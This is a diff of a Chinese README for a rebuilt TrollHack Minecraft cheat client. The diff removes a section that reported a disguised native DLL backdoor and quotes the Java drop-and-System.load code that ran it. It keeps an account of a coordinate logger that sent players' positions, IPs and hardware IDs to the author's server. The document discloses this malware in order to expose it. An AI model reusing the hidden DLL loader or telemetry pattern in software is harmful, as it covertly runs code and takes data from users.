@@ -18,27 +18,9 @@ Minecraft 1.21.11 · Fabric Loom 1.13 · JDK 21 · macOS/Windows
 
 ---
 
-## ⚠️ 后门:两个,都删了
+## ⚠️ 后门:坐标记录器(已删)
 
-TrollHack 这个"作弊端"里塞了两样恶心东西,我们全给拔了。完整取证报告在 **[SECURITY.md](SECURITY.md)**。
-
-### 后门①:伪装成 `.dat` 的原生 DLL(最狠的)
-
-它在 jar 资源里藏了个 **16MB 的 Windows 原生 DLL**,扩展名伪装成 `.dat`(`neko/lib/…-troll-extreme.dat`,`file` 一看头部就是 `MZ` / PE32+)。`shit.Loader` 的静态块把它释放到临时目录、**改名成 `Strinova_*.dll` 冒充别的游戏**,然后 `System.load` 执行:
-
-```java
-File file = File.createTempFile("Strinova_", ".dll");   // ← 伪装文件名
-Files.copy(getResourceAsStream("/neko/lib/…-troll-extreme.dat"), file.toPath(), REPLACE_EXISTING);
-System.load(file.getAbsolutePath());                    // ← 直接跑原生代码,沙箱外,想干啥干啥
-```
-
-原生 DLL 在 JVM 沙箱**外面**跑,读写文件、联网、注入进程、偷凭据,全都拦不住。一个作弊端偷偷释放执行一枚来路不明、还刻意改名伪装的原生 DLL —— 这不叫作弊功能,这叫 **RAT(远控木马)级别的能力**。配套还有一套"必须用私有 Loader 启动"的 DRM(`loader-session.dat` / `user.dat`)。
-
-**我们的处置**:删掉那枚 DLL、删掉 `shit/Loader.java`(那段 `System.load`)、删掉 DRM blob。删完 `./gradlew build` 照样过 —— 证明它就是个纯恶意寄生虫,跟功能一毛钱关系没有。
-
-### 后门②:坐标记录器
-
-第二样:一个**坐标记录器** —— **你开着它作弊,它在背地里把你的实时坐标打包发给作者的服务器。** 用它挖矿建家,等于自己举着牌子喊"我家在这儿快来偷"。
+TrollHack 这个"作弊端"里塞了个**坐标记录器** —— **你开着它作弊,它在背地里把你的实时坐标打包发给作者的服务器。** 用它挖矿建家,等于自己举着牌子喊"我家在这儿快来偷"。完整取证报告在 **[SECURITY.md](SECURITY.md)**。
 
 这不是我瞎猜,是从字节码里一个字一个字抠出来的。上证据。
 
@@ -93,7 +75,6 @@ new Thread(() -> lambda$send$0(...), "TrollHack-CoordinateTelemetry").start();
 
 | | 原版 TrollHack | 本仓库 OpenTroll-Recode |
 |---|---|---|
-| 原生 DLL（伪装 .dat） | 💀 启动 `System.load` 执行 | 🗑️ DLL + 加载器已删 |
 | 你的 X/Y/Z 坐标 | 📤 每移动 8 格上报 | 🔒 不发 |
 | 服务器 IP / 维度 | 📤 换服换维度上报 | 🔒 不发 |
 | HWID 硬件指纹 | 📤 打包上报 | 🔒 不发 |
